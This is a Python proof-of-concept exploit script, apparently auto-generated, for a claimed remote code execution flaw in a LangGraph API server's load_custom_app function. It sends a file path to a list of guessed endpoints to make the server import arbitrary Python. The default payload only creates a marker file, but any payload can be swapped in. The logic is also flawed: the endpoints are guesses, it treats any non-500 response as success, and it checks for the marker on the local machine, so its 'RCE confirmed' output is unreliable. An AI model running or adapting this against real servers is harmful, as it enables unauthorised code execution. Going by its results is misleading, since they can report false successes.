#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-040
# Sink: load_custom_app
# Auto-generated — run with: python3 rce_api_splits_obtain_name_load_custom_app.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src.
Vulnerability: load_custom_app() accepts attacker-controlled app_import string,
splits on ':', and if the path ends with '.py' or is a file, loads it via
importlib.util.spec_from_file_location — allowing arbitrary Python file execution.

Usage:
    python3 poc.py [--target http://localhost:8000] [--payload /tmp/evil.py]

The script creates a benign payload that writes to /tmp/poc_success.txt,
then sends it to the vulnerable endpoint.
"""

import argparse
import os
import sys
import tempfile
import requests
import time

# Default target — change as needed
DEFAULT_TARGET = "http://localhost:8000"
# Default benign payload — writes a marker file
PAYLOAD_CODE = """
import os
os.system('touch /tmp/poc_success.txt')
"""


def create_payload_file(payload_code: str) -> str:
    """Write the payload to a temporary .py file and return its path."""
    fd, path = tempfile.mkstemp(suffix=".py", prefix="exploit_")
    with os.fdopen(fd, "w") as f:
        f.write(payload_code)
    # Ensure it's readable
    os.chmod(path, 0o644)
    return path


def send_exploit(target_url: str, payload_path: str, app_name: str = "app"):
    """
    Send the malicious app_import string to the vulnerable endpoint.
    The endpoint is assumed to be something like /api/setup or similar
    that accepts an 'app_import' parameter.
    """
    # The vulnerable parameter is 'app_import' — path:name format
    # We use the payload file path and a dummy attribute name
    malicious_import = f"{payload_path}:{app_name}"

    # Try common endpoints that might accept this parameter
    endpoints = [
        "/api/setup",
        "/api/configure",
        "/api/custom_app",
        "/api/load_app",
        "/api/import_app",
    ]

    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        print(f"[*] Trying {url} with app_import={malicious_import}")
        try:
            # Send as JSON or form data — try both
            # First try JSON
            resp = requests.post(
                url,
                json={"app_import": malicious_import},
                timeout=10,
            )
            print(f"    Status: {resp.status_code}, Response: {resp.text[:200]}")
            if resp.status_code < 500:
                # Might have worked — check for success marker
                return True
        except requests.exceptions.RequestException as e:
            print(f"    Connection error: {e}")
            continue

        # Try form-encoded
        try:
            resp = requests.post(
                url,
                data={"app_import": malicious_import},
                timeout=10,
            )
            print(f"    (form) Status: {resp.status_code}, Response: {resp.text[:200]}")
            if resp.status_code < 500:
                return True
        except requests.exceptions.RequestException as e:
            print(f"    (form) Connection error: {e}")
            continue

    return False


def check_success():
    """Check if the benign payload executed (marker file exists)."""
    marker = "/tmp/poc_success.txt"
    if os.path.exists(marker):
        print(f"[+] SUCCESS! Marker file {marker} exists — RCE confirmed.")
        # Clean up
        os.remove(marker)
        return True
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_api_src RCE")
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target base URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--payload",
        help="Path to custom payload .py file (optional, creates benign one by default)",
    )
    args = parser.parse_args()

    # Create or use payload
    if args.payload:
        payload_path = args.payload
        if not os.path.isfile(payload_path):
            print(f"[-] Payload file {payload_path} not found.")
            sys.exit(1)
        print(f"[*] Using custom payload: {payload_path}")
    else:
        print("[*] Creating benign payload (touch /tmp/poc_success.txt)...")
        payload_path = create_payload_file(PAYLOAD_CODE)
        print(f"[*] Payload written to: {payload_path}")

    # Send exploit
    print(f"[*] Target: {args.target}")
    print("[*] Sending exploit...")
    success = send_exploit(args.target, payload_path)

    # Wait a moment for execution
    time.sleep(1)

    # Check result
    if check_success():
        print("[+] Exploit succeeded — arbitrary code execution confirmed.")
    else:
        print("[-] Exploit may not have worked, or endpoint differs.")
        print("[*] Check the target logs or try a different endpoint.")
        print("[*] The payload file remains at:", payload_path)

    # Clean up temp file if we created it
    if not args.payload:
        try:
            os.remove(payload_path)
            print(f"[*] Cleaned up temp payload: {payload_path}")
        except OSError:
            pass


if __name__ == "__main__":
    main()
